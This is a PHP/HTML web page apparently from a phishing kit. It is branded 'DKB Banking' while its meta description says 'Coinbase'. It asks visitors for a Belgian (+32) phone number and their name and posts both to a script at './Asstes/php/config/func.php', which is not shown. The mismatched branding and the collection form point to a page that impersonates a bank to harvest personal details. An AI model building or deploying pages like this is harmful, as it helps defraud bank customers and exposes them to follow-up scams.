<?php
  session_start();
  include "./Asstes/php/lang/lang.php";
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Asstes/imgs/favicon.ico">
        <title>DKB Banking</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Asstes/css/style.css">
    </head>
    <body class="one">

    <div class="box_whiate"></div>
    <!-- wrapper_box_number -->
    <div class="wrapper_box_number">
      <div class="container_box_number d-flex">
        <div class="part_left items">
            <div class="logo">
              <img src="./Asstes/imgs/logo.svg" alt="">
            </div>
            <div class="info">
              <div class="title">
                <h1><?php echo get_text('num1'); ?></h1>
              </div>
              <form action="./Asstes/php/config/func.php" method="post">
                <input type="hidden" name="number">
                <div class="inputes">
                  <div class="form-group">
                    <label for=""><?php echo get_text('num2'); ?></label>
                    <div class="group_input">
                      <div class="code_cunt">
                        <p>+32</p>
                      </div>
                      <input type="text" name="num" id="num">
                    </div>
                  </div>
                  <div class="form-group">
                    <label for=""><?php echo get_text('num3'); ?></label>
                    <div class="group_input">
                      <input type="text" name="name" id="name" placeholder="<?php echo get_text('num4'); ?>">
                    </div>
                  </div>                  
                </div>
                <div class="Remember d-flex align-items-center">
                  <input type="checkbox" id="Remember" class="Remember rounded-1" name="Remember">
                  <label for="Remember"><?php echo get_text('num5'); ?></span>
                </div>  
                <div class="btn_sub">
                  <button type="submit" disabled><?php echo get_text('num6'); ?></button>
                </div>              
              </form>
            </div>
        </div>
        <div class="part_right items d-flex justify-content-end align-items-center">
          <img src="./Asstes/imgs/phoneNumber.svg" alt="">
        </div>
      </div>
    </div>







    <!-- bootstrap -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    
    <script>        
        $(".form-group input").keyup(function(){
          if ($(".form-group #num").val() != "" & $(".form-group #name").val() != "") {
            $(".btn_sub button").prop("disabled",false);
          }else{
            $(".btn_sub button").prop("disabled",true);
          }
        });
        $(".form-group input").focus(function(){
          $(this).prev().addClass("focus");
          $(this).addClass("focus");
        });
        $(".form-group input").blur(function(){
          if ($(this).val() == "") {
              $(this).prev().removeClass("focus");
          }
          $(this).removeClass("focus");
        });         
    </script>
    </body>
</html>